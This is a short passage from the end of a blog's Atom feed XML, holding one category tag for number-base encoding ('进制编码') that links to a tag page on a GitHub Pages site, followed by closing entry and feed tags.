      <category term="进制编码" scheme="http://liuhaoan.github.io/tags/%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
</feed>
